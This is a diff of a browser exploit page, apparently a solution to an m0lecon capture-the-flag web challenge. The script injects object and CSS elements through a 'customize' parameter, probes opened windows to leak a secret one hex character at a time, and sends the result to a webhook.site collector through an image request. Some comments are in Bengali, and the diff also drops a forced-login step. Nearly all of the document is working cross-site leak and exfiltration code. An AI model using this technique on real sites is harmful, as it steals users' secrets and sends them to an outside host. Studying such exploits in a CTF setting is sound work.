@@ -2,27 +2,9 @@
 <html>
 <body>
 <script>
-const APP_URL = 'https://thoughts.challs.m0lecon.it';
-async function login(){
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = APP_URL + "/login";
-    form.target = '_blank'; // open in new tab
-    
-    const userField = document.createElement('input');
-    userField.name = 'username';
-    userField.value = 'xyx';
-    form.appendChild(userField);
-    
-    const passField = document.createElement('input');
-    passField.name = 'password';
-    passField.value = 'xyxxyx';
-    form.appendChild(passField);
-    
-    document.body.appendChild(form);
-    form.submit();
-    await new Promise(resolve => setTimeout(resolve, 500));
-}
+const APP_URL = 'https://192.168.0.128:3000'; // app url (local IP দিলে change)
+const WEBHOOK = 'https://webhook.site/dab93e6e-4b06-4c84-b648-9e038c8ee27b'; // তোমার webhook.site url
+
 function object_gen(){
     let res = [];
     let hex_c = "0123456789abcdef"
@@ -41,35 +23,27 @@ function css_gen(prefix){
     return res.join("\n")
 }
 async function probe(w){
-    //check which hex char mapped object has been applied display:none;
     let hex_c = "0123456789abcdef"
     for (let i of hex_c){
-        try {
-            let _x = w[`p-${i}`]
-        }
-        catch {
-            return i
-        }
+        try { let _x = w[`p-${i}`] } catch { return i }
     }
     return -1
 }
 async function leak() {
-  await login()
   let obj_elm = object_gen()
   let leaked = ""
   for(let i = 0; i < 6; i++){
-    let style_elm = css_gen(leaked) //create css using leaked chars as prefix
+    let style_elm = css_gen(leaked)
     const customizePayload = encodeURIComponent(obj_elm+style_elm+`<meta http-equiv=refresh content=1>`);
     const w = window.open(`${APP_URL}/?customize=${customizePayload}`, '_blank');
-
-    //we wait now to let the page refresh, and probe before 2nd refresh hits.
     await new Promise(resolve => setTimeout(resolve, 1650));
     leaked += await probe(w)
   }
-  console.log(leaked)
-  fetch("https://webhook.site/dab93e6e-4b06-4c84-b648-9e038c8ee27b/?secret="+leaked)
+  // leak শেষ হলে webhook/site-এ পাঠাও
+  new Image().src = WEBHOOK + "?secret=" + leaked
 }
 leak();
+
 </script>
 </body>
 </html>
